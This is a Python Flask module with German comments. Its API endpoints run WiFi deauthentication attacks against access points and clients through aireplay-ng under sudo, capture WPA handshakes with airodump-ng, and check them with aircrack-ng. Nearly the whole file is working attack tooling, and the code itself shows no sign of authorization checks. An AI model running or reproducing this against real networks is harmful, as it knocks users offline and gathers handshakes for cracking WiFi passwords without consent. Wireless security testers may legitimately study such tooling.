import os
import uuid
import subprocess
import netifaces
from datetime import datetime
from flask import Blueprint, request, jsonify, current_app
from flask_cors import cross_origin
from subprocess import TimeoutExpired, CalledProcessError

from api.app import db
from api.models import DeauthAction, AccessPoint

deauth_bp = Blueprint('deauth_bp', __name__)


def has_handshake(handshake_file: str) -> bool:
    """Überprüft mit aircrack-ng, ob ein WPA-Handshake enthalten ist."""
    try:
        result = subprocess.run(
            ['aircrack-ng', '-J', '/tmp/handshake_check', handshake_file],
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            timeout=30
        )
        # aircrack-ng zeigt "(1 handshake)" in der Ausgabe, wenn ein Handshake vorhanden ist
        return '(1 handshake)' in result.stdout
    except (subprocess.CalledProcessError, subprocess.TimeoutExpired):
        return False


@deauth_bp.route('/deauth/start', methods=['POST', 'OPTIONS'])
@cross_origin()
def start_deauth():
    # CORS preflight
    if request.method == 'OPTIONS':
        return '', 200

    try:
        data = request.get_json() or {}
        mac = data.get("mac")
        is_client = data.get("is_client", False)
        packets = int(data.get("packets", 10))
        duration = int(data.get("duration", 60))
        channel = int(data.get("channel", 1))
        scan_id = data.get("scan_id")
        secret = current_app.config.get('SUDO_SECRET', '')

        if not mac:
            return jsonify({"error": "MAC-Adresse erforderlich"}), 400

        interface = current_app.config.get("DEAUTH_INTERFACE", "wlan0")
        if interface not in netifaces.interfaces():
            return jsonify({"error": "Keine WLAN-Schnittstelle gefunden"}), 400

        base_path = os.path.abspath(os.path.join(os.path.dirname(__file__), '../scripts'))
        aireplay_script = os.path.join(base_path, "aireplay-ng_deauth.sh")
        airodump_script = os.path.join(base_path, "airodump-ng_handshake.sh")

        uid = uuid.uuid4().hex
        cap_prefix = f"handshake_scan_ap_{mac.replace(':', '').lower()}_{uid}"
        handshake_file = os.path.abspath(os.path.join(os.path.dirname(__file__), f"../scans/{cap_prefix}-01.cap"))

        current_app.logger.info(f"🔌 Starte Deauth von AP {mac} auf Kanal {channel}, Dauer {duration}s, Pakete {packets}")

        # AccessPoint-Kanal
        ap = db.session.query(AccessPoint).filter_by(scan_id=scan_id, bssid=mac).first()
        ap_channel = channel
        if ap and ap.channel:
            ap_channel = ap.channel

        # 1) Handshake-Mitschnitt starten
        airodump_proc = None
        if not is_client and packets < 9999:
            airodump_cmd = [
                'sudo', '-n', 'bash', airodump_script,
                interface,
                cap_prefix,
                mac,
                str(duration),
                str(ap_channel),
                secret
            ]
            airodump_proc = subprocess.Popen(airodump_cmd,
                                             stdout=subprocess.DEVNULL,
                                             stderr=subprocess.DEVNULL)

        # 2) Deauth senden
        aireplay_cmd = [
            'sudo', '-n', 'bash', aireplay_script,
            interface,
            mac,
            str(packets),
            str(ap_channel),
            secret
        ]
        deauth_proc = subprocess.Popen(aireplay_cmd,
                                       stdout=subprocess.DEVNULL,
                                       stderr=subprocess.DEVNULL)

        # 3) Prozesse beenden
        try:
            deauth_proc.wait(timeout=duration + 5)
        except TimeoutExpired:
            current_app.logger.warning("Timeout beim Deauth-Prozess")
        if airodump_proc:
            try:
                airodump_proc.wait(timeout=duration + 5)
                current_app.logger.warning("Handshake-Mitschnitt durchgelaufen.")
            except TimeoutExpired:
                current_app.logger.warning("Handshake-Mitschnitt abgebrochen (Timeout)")

        # 4) Handshake prüfen
        handshake_found = has_handshake(handshake_file)
        current_app.logger.info(f"Handshake-Datei {handshake_file}, gefunden: {handshake_found}")

        # 5) Speichern
        action = DeauthAction(
            scan_id=scan_id,
            mac=mac,
            is_client=is_client,
            packets=packets,
            duration=duration,
            result_file=cap_prefix + '.cap' if handshake_found else None,
            success=handshake_found,
            started_at=datetime.utcnow()
        )
        db.session.add(action)
        db.session.commit()

        return jsonify({
            'message': 'Deauth abgeschlossen',
            'mac': mac,
            'success': handshake_found,
            'file': cap_prefix + '.cap' if handshake_found else None
        }), 200

    except Exception as e:
        current_app.logger.error(f"Fehler beim Deauth: {e}")
        return jsonify({'error': str(e)}), 500


@deauth_bp.route('/deauth/start_deauth_client', methods=['POST', 'OPTIONS'])
@cross_origin()
def start_deauth_client():
    # CORS preflight
    if request.method == 'OPTIONS':
        return '', 200

    try:
        data = request.get_json() or {}
        scan_id = data.get('scan_id')
        ap_mac = data.get('ap_mac')
        client_mac = data.get('client_mac')
        channel = int(data.get('channel', 6))
        packets = int(data.get('packets', 10))
        duration = int(data.get('duration', 60))
        secret = current_app.config.get('SUDO_SECRET', '')

        if not (scan_id and ap_mac and client_mac):
            return jsonify({'error': 'scan_id, ap_mac und client_mac erforderlich'}), 400

        interface = current_app.config.get("DEAUTH_INTERFACE", "wlan0")
        if interface not in netifaces.interfaces():
            return jsonify({'error': 'Keine WLAN-Schnittstelle gefunden'}), 400

        base_path = os.path.abspath(os.path.join(os.path.dirname(__file__), '../scripts'))
        aireplay_script = os.path.join(base_path, 'aireplay-ng_deauth_client.sh')
        airodump_script = os.path.join(base_path, 'airodump-ng_handshake_client.sh')

        uid = uuid.uuid4().hex
        cap_prefix = f"handshake_scan_client_{ap_mac.replace(':','').lower()}_{uid}"
        handshake_file = os.path.abspath(os.path.join(os.path.dirname(__file__), f"../scans/{cap_prefix}-01.cap"))

        # 1) Mitschnitt
        handshake_proc = None
        if packets < 9999:
            hs_cmd = [
                'sudo', '-n', 'bash', airodump_script,
                interface,
                cap_prefix,
                ap_mac,
                str(duration),
                str(channel),
                secret
            ]
            handshake_proc = subprocess.Popen(hs_cmd,
                                              stdout=subprocess.DEVNULL,
                                              stderr=subprocess.DEVNULL)

        # 2) Deauth-Pakete
        deauth_cmd = [
            'sudo', '-n', 'bash', aireplay_script,
            interface,
            ap_mac,
            client_mac,
            str(channel),
            str(packets),
            secret
        ]
        deauth_proc = subprocess.Popen(deauth_cmd,
                                       stdout=subprocess.DEVNULL,
                                       stderr=subprocess.DEVNULL)

        # 3) Warten
        try:
            deauth_proc.wait(timeout=duration + 5)
        except TimeoutExpired:
            current_app.logger.warning("Timeout beim Client-Deauth")
        if handshake_proc:
            try:
                handshake_proc.wait(timeout=duration + 5)
            except TimeoutExpired:
                current_app.logger.warning("Handshake-Mitschnitt Client abgebrochen")

        # 4) Prüfen
        handshake_found = has_handshake(handshake_file)
        current_app.logger.info(f"Client-Handshake {handshake_file}, gefunden: {handshake_found}")

        # 5) Speichern
        action = DeauthAction(
            scan_id=scan_id,
            mac=client_mac,
            is_client=True,
            packets=packets,
            duration=duration,
            result_file=cap_prefix + '.cap' if handshake_found else None,
            success=handshake_found,
            started_at=datetime.utcnow()
        )
        db.session.add(action)
        db.session.commit()

        return jsonify({
            'message': 'Client-Deauth abgeschlossen',
            'ap_mac': ap_mac,
            'client_mac': client_mac,
            'success': handshake_found,
            'file': cap_prefix + '.cap' if handshake_found else None
        }), 200

    except Exception as e:
        current_app.logger.error(f"Fehler Deauth Client: {e}")
        return jsonify({'error': str(e)}), 500



